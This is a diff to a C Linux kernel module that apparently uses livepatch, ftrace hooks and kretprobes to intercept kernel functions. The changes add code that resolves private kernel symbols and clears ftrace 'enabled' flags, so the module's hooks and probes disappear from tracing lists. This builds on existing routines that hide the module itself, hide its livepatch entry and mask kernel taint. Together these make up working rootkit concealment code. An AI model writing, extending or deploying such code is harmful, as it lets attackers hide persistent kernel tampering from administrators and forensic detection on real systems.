@@ -134,7 +134,7 @@ static unsigned long *p_tainted_mask = NULL;
 
 //static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
 //static struct ftrace_ops *p_ftrace_list_end = NULL;
-//static struct mutex *p_ftrace_lock = NULL;
+static struct mutex *p_ftrace_lock = NULL;
 static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
 static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
 static struct ftrace_page       **p_ftrace_pages_start = NULL;
@@ -150,6 +150,9 @@ static void (*p_free_uid)(struct user_struct *up) = NULL;
 static struct user_struct *(*p_find_user)(kuid_t uid) = NULL;
 
 static rwlock_t *p_tasklist_lock = NULL;
+
+static struct ftrace_ops *p_kprobe_ftrace_ops = NULL;
+static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;
 
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
@@ -662,16 +665,101 @@ static int remove_ftrace_ops(struct ftrace_ops *ops)
                 }                               \
         }
 
-static void hidden_from_enabled_functions(struct klp_object *obj )
+
+static void hidden_ftrace_ops(struct ftrace_ops *fops)
+{
+	struct ftrace_hash *hash = NULL;
+	//struct ftrace_func_entry *entry = NULL;
+	struct ftrace_page *pg = NULL;
+	struct dyn_ftrace *rec = NULL;
+
+	if (!fops)
+		return;
+
+	mutex_lock(p_ftrace_lock);
+
+	hash = fops->func_hash->filter_hash ;
+	do_for_each_ftrace_rec(pg, rec) {
+		if (p_ftrace_lookup_ip(hash, rec->ip)) {
+			rec->flags &= ~FTRACE_FL_ENABLED;
+			rec->flags &= FTRACE_FL_MASK;
+		}
+	} while_for_each_ftrace_rec();
+
+	mutex_unlock(p_ftrace_lock);
+
+#if 0
+	entry = p_ftrace_lookup_ip(hash, ftrace_loc);
+	if (entry) {
+		hlist_del(&entry->hlist);
+		hash->count--;
+	}
+
+	remove_ftrace_ops(fops);
+	fops->flags &= ~FTRACE_OPS_FL_ENABLED;
+#endif
+}
+
+static void hidden_from_enabled_functions_ftrace_hooks(struct ftrace_hook *hooks, int num)
+{
+	int i = 0;
+
+	if (!hooks || num <= 0) 
+		return;
+
+	for (i = 0; i < num; i++) 
+		hidden_ftrace_ops(&(hooks[i].ops));
+
+	return;
+}
+
+
+static void hidden_ftrace_ops_addr(struct ftrace_ops *fops, kprobe_opcode_t *addr)
+{
+	struct ftrace_hash *hash = NULL;
+	//struct ftrace_func_entry *entry = NULL;
+	struct ftrace_page *pg = NULL;
+	struct dyn_ftrace *rec = NULL;
+
+	if (!fops)
+		return;
+
+	mutex_lock(p_ftrace_lock);
+
+	hash = fops->func_hash->filter_hash ;
+	do_for_each_ftrace_rec(pg, rec) {
+		if (rec->ip == (unsigned long)addr && p_ftrace_lookup_ip(hash, rec->ip)) {
+			rec->flags &= ~FTRACE_FL_ENABLED;
+			rec->flags &= FTRACE_FL_MASK;
+		}
+	} while_for_each_ftrace_rec();
+
+	mutex_unlock(p_ftrace_lock);
+}
+
+static void hidden_from_enabled_functions_kprobe(struct kretprobe **rps, int num)
+{
+	int i = 0;
+	bool ipmodify ;
+
+	for (i = 0; i < num; i++) {
+		ipmodify = (rps[i]->kp.post_handler != NULL);
+
+		if (ipmodify)
+			hidden_ftrace_ops_addr(p_kprobe_ipmodify_ops, rps[i]->kp.addr);
+		else
+			hidden_ftrace_ops_addr(p_kprobe_ftrace_ops, rps[i]->kp.addr);
+	}
+
+	return;
+}
+
+static void hidden_from_enabled_functions_klp(struct klp_object *obj )
 {
 	struct klp_func *func = NULL;
 	struct klp_ops *ops = NULL;
 	struct ftrace_ops *fops = NULL;
-	struct ftrace_hash *hash = NULL;
 	unsigned long ftrace_loc;
-	//struct ftrace_func_entry *entry = NULL;
-	struct ftrace_page *pg = NULL;
-	struct dyn_ftrace *rec = NULL;
 
 	klp_for_each_func(obj, func) {
 		ops = p_klp_find_ops(func->old_func);
@@ -684,24 +772,7 @@ static void hidden_from_enabled_functions(struct klp_object *obj )
 		if (!ftrace_loc) 
 			continue;
 
-		hash = fops->func_hash->filter_hash ;
-		do_for_each_ftrace_rec(pg, rec) {
-			if (p_ftrace_lookup_ip(hash, rec->ip)) {
-				rec->flags &= ~FTRACE_FL_ENABLED;
-				rec->flags &= FTRACE_FL_MASK;
-			}
-		} while_for_each_ftrace_rec();
-
-#if 0
-		entry = p_ftrace_lookup_ip(hash, ftrace_loc);
-		if (entry) {
-			hlist_del(&entry->hlist);
-			hash->count--;
-		}
-
-		remove_ftrace_ops(fops);
-		fops->flags &= ~FTRACE_OPS_FL_ENABLED;
-#endif
+		hidden_ftrace_ops(fops);
         }
 }
 
@@ -1071,11 +1142,12 @@ static int livepatch_init(void)
 	if (!p_tainted_mask)
 		return -1;
 
-#if 0
+//#if 0
 	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
 	if (!p_ftrace_lock)
 		return -1;
 
+#if 0
 	p_ftrace_ops_list = (struct ftrace_ops **) kallsyms_lookup_name("ftrace_ops_list");
 	if (!p_ftrace_ops_list)
 		return -1;
@@ -1170,18 +1242,30 @@ static int livepatch_init(void)
 	if (!p_find_user)
 		return -1;
 
+	p_kprobe_ftrace_ops = (struct ftrace_ops *)
+				 kallsyms_lookup_name("kprobe_ftrace_ops");
+	if (!p_kprobe_ftrace_ops)
+		return -1;
+
+	p_kprobe_ipmodify_ops = (struct ftrace_ops *)
+				 kallsyms_lookup_name("kprobe_ipmodify_ops");
+	if (!p_kprobe_ipmodify_ops)
+		return -1;
+
 	
 	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	hidden_from_enabled_functions_ftrace_hooks(hooks, ARRAY_SIZE(hooks));
 
 	save_tainted_mask();
 	ret = klp_enable_patch(&patch);
 	if (ret == 0) { 
 		hidden_module(this_module);
 		hidden_from_sys_livepatch(&patch);
-		hidden_from_enabled_functions(objs);
+		hidden_from_enabled_functions_klp(objs);
 	}
 
 	register_kretprobes(rps, 2);
+	hidden_from_enabled_functions_kprobe(rps, 2);
 
 	restore_tainted_mask();
 
